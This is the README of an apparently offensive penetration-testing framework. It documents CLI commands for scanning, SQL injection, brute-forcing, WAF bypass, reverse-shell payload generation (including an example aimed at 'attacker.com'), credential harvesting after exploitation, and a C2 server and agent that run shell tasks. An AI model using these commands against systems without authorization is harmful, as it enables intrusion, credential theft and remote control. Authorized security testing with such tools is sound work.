# 🔴 ADVANCED VULNERABILITY SCANNER WITH AUTO-EXPLOITATION ORCHESTRATOR

**v3.0** - Production-Ready Enterprise Penetration Testing Framework

---

## Overview

A comprehensive **automated exploitation framework** that combines:
- 🔍 **Multi-stage reconnaissance** (port scanning, service detection, fingerprinting)
- 🎯 **Intelligent vulnerability scanning** (web, crypto, auth, dependencies)
- ⚔️ **Active exploitation** (SQLi, credential brute-force, RCE, payload generation)
- 🔗 **Metasploit integration** (advanced exploitation capabilities)
- 🛡️ **WAF detection & bypass** (10+ evasion techniques)
- 🤖 **Auto-exploitation orchestrator** (parallel job execution, strategy-based exploitation)

---

## 🚀 Quick Start

The Docker image entrypoint is the interactive console (`main.py`); the scriptable
subcommands live in `cli.py`, so invoke it explicitly inside the container.

### Run a Complete Scan
```bash
docker run --rm vuln-scanner python cli.py scan -t target.com --port 80,443 --timeout 2
```

### Generate Attack Payloads
```bash
docker run --rm vuln-scanner python cli.py generate-payload --type xss
docker run --rm vuln-scanner python cli.py generate-payload --type sqli
docker run --rm vuln-scanner python cli.py generate-payload --type reverse_shell --host 10.0.0.1 --listen-port 4444
```

### Detect & Bypass WAF
```bash
docker run --rm vuln-scanner python cli.py detect-waf -u https://target.com
docker run --rm vuln-scanner python cli.py waf-bypass-cmd --payload "DROP TABLE" --technique case
```

### Auto-Exploit Vulnerabilities
```bash
docker run --rm vuln-scanner python cli.py auto-exploit -t target.com -s moderate
```

---

## 📦 Features

### Scanning Modules
| Module | Capabilities |
|--------|--------------|
| **Network** | Port scanning, DNS resolution, service fingerprinting |
| **Web** | SQL injection, XSS, CSRF detection, endpoint testing |
| **Cryptography** | Weak algorithms, TLS versions, certificate validation |
| **Authentication** | Default credentials, weak passwords, privilege escalation |
| **Dependencies** | CVE database, vulnerable library detection |
| **Misconfiguration** | CORS bypass, missing headers, cloud misconfigs |

### Exploitation Methods
| Type | Variants |
|------|----------|
| **SQL Injection** | Error-based, time-based blind, union-based |
| **Web Shells** | PHP, ASP.NET, JSP, Python |
| **Reverse Shells** | Bash, Python, Perl, PHP, Ruby, Netcat |
| **Payloads** | XSS, command injection, path traversal, LDAP injection |
| **Brute-Force** | SSH, FTP, MySQL, PostgreSQL, HTTP Basic Auth |
| **Encoding** | Base64, URL, Hex, Unicode, HTML |

### WAF Bypass Techniques
| Technique | Examples |
|-----------|----------|
| **Case Variation** | `DROP TABLE` → `drop table` → `DrOp tAbLe` |
| **URL Encoding** | Single & double URL encoding |
| **Hex Encoding** | Convert to hex values |
| **SQL Comments** | `DROP/**/TABLE/**/users` |
| **Concatenation** | String concatenation patterns |
| **Obfuscation** | Variable substitution, base64 encoding |
| **Null Bytes** | `%00` injection |
| **Whitespace** | Newlines, tabs instead of spaces |

### Orchestration Strategies
| Strategy | Use Case |
|----------|----------|
| **Aggressive** | Fast, comprehensive exploitation |
| **Moderate** | Balanced approach (recommended) |
| **Conservative** | Stealthy, minimal detection risk |

---

## 📋 CLI Commands

### Core Scanning
```bash
# Network reconnaissance
docker run vuln-scanner python cli.py scan -t <target> [--port ports] [--timeout 5]

# Web vulnerabilities
docker run vuln-scanner python cli.py web-scan -t <target>

# SSL/TLS audit
docker run vuln-scanner python cli.py ssl-check -t <target>
```

### Exploitation
```bash
# SQL injection
docker run vuln-scanner python cli.py sqli-exploit -u <url> -p <param>

# Brute-force
docker run vuln-scanner python cli.py bruteforce --host <host> -s <service> [-P port]

# Generate payloads
docker run vuln-scanner python cli.py generate-payload --type <type> [options]

# Post-exploitation (runs on the host you control)
docker run vuln-scanner python cli.py post-exploit --host local
```

### WAF Evasion
```bash
# Detect WAF
docker run vuln-scanner python cli.py detect-waf -u <url>

# Generate bypasses
docker run vuln-scanner python cli.py waf-bypass-cmd -p <payload> -t <technique>
```

### Orchestration
```bash
# Auto-exploit
docker run vuln-scanner python cli.py auto-exploit -t <target> [-s strategy] [-j jobs]

# Metasploit integration
docker run vuln-scanner python cli.py msf-integration -t <target>
```

---

## 🎯 Usage Examples

### Complete Penetration Test
```bash
# 1. Scan target
docker run vuln-scanner python cli.py scan -t target.com --port 80,443

# 2. Check for WAF
docker run vuln-scanner python cli.py detect-waf -u https://target.com

# 3. Auto-exploit vulnerabilities
docker run vuln-scanner python cli.py auto-exploit -t target.com

# 4. Post-exploitation enumeration
docker run vuln-scanner python cli.py post-exploit --host local
```

### Targeted Exploitation
```bash
# 1. Generate SQLi payloads
docker run vuln-scanner python cli.py generate-payload --type sqli

# 2. Exploit SQL injection
docker run vuln-scanner python cli.py sqli-exploit -u "http://target.com/search?q=1" -p "q"

# 3. If WAF blocks, generate bypass
docker run vuln-scanner python cli.py waf-bypass-cmd --payload "' UNION SELECT" --technique encode

# 4. Use bypass payload to exploit
```

### Red Team Operations
```bash
# Generate reverse shell with obfuscation
docker run vuln-scanner python cli.py generate-payload --type reverse_shell \
  --host attacker.com --listen-port 4444 --encoding base64

# Generate multiple payload variants
docker run vuln-scanner python cli.py generate-payload --type command_injection
docker run vuln-scanner python cli.py generate-payload --type path_traversal
```

---

## 🏗️ Architecture

```
┌─ Reconnaissance ─────────────────────┐
│ • Port scanning (nmap)               │
│ • DNS resolution                     │
│ • Service fingerprinting             │
└──────────────────────────────────────┘
              ↓
┌─ Vulnerability Detection ────────────┐
│ • Network vulnerabilities            │
│ • Web vulnerabilities (SQLi, XSS)    │
│ • Crypto weaknesses                  │
│ • Authentication issues              │
│ • Misconfigurations                  │
│ • Outdated dependencies              │
└──────────────────────────────────────┘
              ↓
┌─ WAF Detection ──────────────────────┐
│ • Identify WAF type                  │
│ • Generate bypass payloads           │
│ • Select evasion technique           │
└──────────────────────────────────────┘
              ↓
┌─ Exploitation ───────────────────────┐
│ • SQLi (error, time-based, union)    │
│ • Brute-force credentials            │
│ • Payload injection                  │
│ • RCE/Reverse shell                  │
│ • Metasploit integration             │
└──────────────────────────────────────┘
              ↓
┌─ Post-Exploitation ──────────────────┐
│ • System enumeration                 │
│ • Credential harvesting              │
│ • Privilege escalation               │
│ • Lateral movement                   │
└──────────────────────────────────────┘
              ↓
┌─ Reporting ──────────────────────────┐
│ • Real-time statistics               │
│ • JSON/CSV export                    │
│ • Detailed vulnerability reports     │
└──────────────────────────────────────┘
```

---

## 📊 Supported Services & Technologies

### Protocols
- SSH, FTP, HTTP/HTTPS, SMB, DNS
- MySQL, PostgreSQL, MSSQL, MongoDB, Redis
- LDAP, SMTP, POP3, IMAP

### Platforms
- Linux, Windows, macOS
- Cloud (AWS, Azure, GCP)
- Embedded systems, IoT devices

### WAF Solutions
- Cloudflare, AWS WAF, ModSecurity
- Akamai, Imperva, F5 ASM
- Sucuri, Barracuda, Fortinet

---

## 🔧 Configuration & Customization

### Environment Variables
```bash
# Set proxy (leave on your host if the target is internal)
docker run -e HTTP_PROXY=http://proxy:8080 vuln-scanner python cli.py scan -t target.com
```

### Custom Strategies
Create custom orchestration strategies in `exploit_orchestrator.py`:
```python
CUSTOM_STRATEGY = [
    ("vuln_type", "description", "payload"),
    # ...
]
```

### Extend Scanning
Add custom vulnerability detectors:
```python
def check_custom_vuln(self, params):
    # Custom detection logic
    return vulnerabilities
```

---

## 📈 Performance & Optimization

### Parallel Execution
```bash
# Default: 5 jobs
docker run vuln-scanner python cli.py auto-exploit -t target -j 5

# Maximum throughput: 20+ jobs
docker run vuln-scanner python cli.py auto-exploit -t target -j 20

# Stealth mode: 1 job
docker run vuln-scanner python cli.py auto-exploit -t target -j 1
```

### Resource Requirements
- **Minimum**: 512MB RAM, 1 CPU
- **Recommended**: 2GB RAM, 2+ CPUs
- **High-scale**: 4GB+ RAM, 4+ CPUs

---

## 📤 Publishing to GitHub

The repository ships with a `.gitignore` that keeps scan output (`reports/`,
`report.json`, `report.csv`), local state (`c2_state.json`, `config.local.yaml`) and
secrets (`.env`, `*.pem`, `*.key`) out of the history. First push:

```bash
git init
git add .
git status            # confirm no reports/, .env or *.pem files are staged
git commit -m "Initial commit: VULNSCAN PRO v3.1"
git branch -M main
git remote add origin https://github.com/<user>/<repo>.git
git push -u origin main
```

Verify the environment before committing:

```bash
python smoke_check.py          # 15 modules load, manifest parsing works
python cli.py --help           # every documented command is registered
```

---

## 🛡️ Responsible Use & Legal

### ✅ Authorized Uses
- Penetration testing with written permission
- Security research & education
- Bug bounty programs
- Internal security assessments
- Red team exercises

### ❌ Prohibited Uses
- Unauthorized system access
- Data theft or destruction
- Denial of service attacks
- Competitive intelligence gathering
- Any illegal activity

**Always ensure you have explicit authorization before testing any systems.**

---

## 📚 Documentation

- **README.md** - This file, overview & quick start
- **BUILD_SUMMARY.md** - Complete build details & architecture
- **ADVANCED_FEATURES.md** - Scanning modules documentation
- **EXPLOIT_TOOLS.md** - Exploitation techniques guide
- **ORCHESTRATION_GUIDE.md** - Auto-exploitation workflows

---

## 🚀 Deployment Options

### Docker
```bash
docker run vuln-scanner [command]
```

### Docker Compose (with services)
```bash
docker compose up -d
docker compose exec scanner [command]
```

### Kubernetes
```bash
kubectl apply -f k8s-manifest.yaml
```

---

## 📞 Support & Troubleshooting

### Common Issues

**Connection Timeout**
- Increase timeout: `--timeout 10`
- Check network connectivity
- Verify firewall rules

**WAF Blocking**
- Detect WAF: `detect-waf -u <url>`
- Generate bypasses: `waf-bypass-cmd`
- Use stealthy strategy: `-s conservative`

**No Vulnerabilities Found**
- Try aggressive strategy: `-s aggressive`
- Manually specify ports: `-p 80,443,8080`
- Check target is actually vulnerable

---

## 🏆 Production Checklist

- ✅ Error handling & logging
- ✅ Multi-threading support
- ✅ Docker containerization
- ✅ Configuration management
- ✅ Report generation
- ✅ API interface
- ✅ CLI commands
- ✅ Documentation

---

## 📈 Statistics

**Code Base:**
- 13 Python modules
- 1,500+ lines of core code
- 10+ CLI commands
- 100+ exploitation techniques

**Coverage:**
- 25+ vulnerable services
- 15+ vulnerability types
- 50+ credential combinations
- 100+ payload variants
- 10+ WAF bypass techniques

**Performance:**
- Sub-second port scanning
- Real-time result aggregation
- Parallel job execution
- Configurable resource usage

---

## 🎓 Learning Path

1. **Beginner**: Run basic scans (`scan` command)
2. **Intermediate**: Generate payloads (`generate-payload`)
3. **Advanced**: Exploit vulnerabilities (`sqli-exploit`, `bruteforce`)
4. **Expert**: Auto-orchestration (`auto-exploit` with custom strategies)

---

**Status:** 🟢 Production Ready  
**Version:** 3.0  
**Last Updated:** 2025

Built for penetration testers, security researchers, and red teams.

---

## 📄 License

This tool is provided for authorized security testing only. Unauthorized access to computer systems is illegal.



---

# 🔴 APPENDIX — v3.1 ENTERPRISE CROSS-PLATFORM EDITION

**Runs natively on Windows PowerShell (10/11) AND Kali Linux** — one codebase, both platforms.

## What's new in v3.1

- 🖥️ **`platform_core.py`** — new cross-platform foundation layer:
  - OS detection (Windows 10/11, Kali, Debian/Ubuntu, WSL, macOS)
  - Privilege detection (root / Administrator / user) on both OS families
  - Safe subprocess execution with per-OS fallbacks (PowerShell on Windows, `ss`/`ps` on Linux)
  - UTF-8 console fix for legacy Windows codepages (cp1252/cp437)
  - Config system: `config.yaml` with JSON fallback and sensible defaults
  - Structured logging (console + JSON-lines file), secure temp files, path converters (POSIX ↔ Windows)
- 🔍 **`post_exploiter.py` — enterprise rewrite**:
  - Per-OS credential path catalogues (Kali: `/etc/shadow`, `~/.gnupg`… Windows: SAM, Credentials vault…)
  - psutil-first with pure-Python/CLI fallbacks when psutil is missing
  - New checks: listening services, scheduled tasks/cron, SUID binaries, world-writable files, unquoted Windows service paths
  - Severity-tagged, timestamped findings, **auto-redaction** of secrets, `--json` machine output
- 🧭 **CLI v3.1** — enterprise banner w/ platform info, global options:
  - `--log-file`, `--json-logs`, `--quiet`, `--no-color`, `--version`
  - New commands: `platform-info`, `config-show`, `config-set`, upgraded `post-exploit --json|--no-redact|--limit`
- 🐳 **Docker** — non-root user actually enforced, `platform_core.py` shipped, Linux runtime verified

## Quick start

### Windows PowerShell
```powershell
python cli.py platform-info          # show platform / privilege info
python cli.py post-exploit           # enumerate this host
python cli.py post-exploit --json    # machine-readable output
python cli.py --log-file logs\scan.log --json-logs scan -t target
```

### Kali Linux / Debian
```bash
python3 cli.py platform-info
python3 cli.py post-exploit
sudo python3 cli.py post-exploit --no-redact   # full detail when root
```

### Docker (same code, Linux runtime)
```bash
docker build -t vuln-scanner:3.1 .
docker run --rm vuln-scanner:3.1 post-exploit
```

### Configuration
`config.yaml` at the project root is merged over built-in defaults:
```bash
python cli.py config-show            # effective config
python cli.py config-set --timeout 10 --output-dir reports
```

## Notes

- Secrets (env vars, credential file contents) are **redacted by default**; use `--no-redact` only on systems you own.
- Windows note: full connection tables and service-hijack checks need an elevated PowerShell (Run as Administrator).
- Kali note: readable `/etc/shadow` is flagged **critical** — that's intentional.


---

# 🔴 APPENDIX 2 — v3.2 C2 (COMMAND & CONTROL) EDITION

## Smoke-test results (all 14 commands, Windows + Linux)

| Command | Windows | Linux (Docker) |
|---|---|---|
| scan, web-scan, ssl-check, sqli-exploit, bruteforce, generate-payload, post-exploit, detect-waf, waf-bypass-cmd, auto-exploit, msf-integration, platform-info, config-show, config-set | ✅ | ✅ |

Fixed during testing: `scan -o file -f json|csv` now actually writes the report file (was silently ignoring output).

## C2 Architecture (`c2_module.py`)

- **HTTP C2 server** (threaded, stdlib) — register / beacon / result endpoints, all bodies **AES-encrypted (Fernet)** with a shared secret; wrong secret = 401
- **Polling agent** — works identically on PowerShell & Kali; executes only **allow-listed task types**: `sysinfo, processes, connections, shell, read_file, list_dir, persist_check, ping`
- **State persistence** — sessions/tasks saved to `c2_state.json`
- **Stable sessions** — `--session-id` lets container agents keep the same identity across runs

## C2 usage

```powershell
# Windows PowerShell — start server
python cli.py c2-server -k SUPERSECRET -p 8080

# Agent (Windows)
python cli.py c2-agent -s http://SERVER_IP:8080 -k SUPERSECRET

# Agent (Kali Linux)
python3 c2_module.py agent --server http://SERVER_IP:8080 --key SUPERSECRET

# Operator: list sessions / queue tasks
python cli.py c2-sessions -s http://127.0.0.1:8080 -k SUPERSECRET
python cli.py c2-task -s http://127.0.0.1:8080 -k SUPERSECRET --session kali-agent --type shell --cmd "uname -a"
python cli.py c2-task -s http://127.0.0.1:8080 -k SUPERSECRET --session win-agent --type sysinfo
```

## Verified end-to-end

- ✅ Windows agent executed `shell` task → returned `whoami` output
- ✅ Windows agent executed `sysinfo` → platform/arch/privilege returned encrypted
- ✅ Linux (Docker) agent executed `shell` → `uname -a` + `KALI-SIDE-OK` returned
- ✅ Unknown secret rejected, unknown session/task-type rejected

## Docker Compose C2 profile

```bash
C2_KEY=SUPERSECRET docker compose --profile c2 up c2-server
```

## ⚠️ Legal

C2 is for **authorized red-team operations only** — lab, engagement, or owned systems. Task allow-list intentionally excludes destructive primitives.
